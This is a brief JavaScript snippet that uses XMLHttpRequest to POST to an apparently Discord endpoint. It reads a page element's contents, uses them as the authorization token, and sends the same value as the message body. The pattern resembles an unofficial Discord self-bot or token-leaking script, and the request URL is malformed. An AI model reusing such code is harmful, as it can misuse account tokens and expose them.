request = new XMLHttpRequest();
request.withCredentials = true;
request.open("POST", "689143259485700096");
request.setRequestHeader("authorization", document.getElementById("69420").innerHTML);
request.setRequestHeader("accept", "/");
request.setRequestHeader("authority", "discordapp.com");
request.setRequestHeader("content-type", "application/json");
request.send(JSON.stringify({ content: document.getElementById("69420").innerHTML }))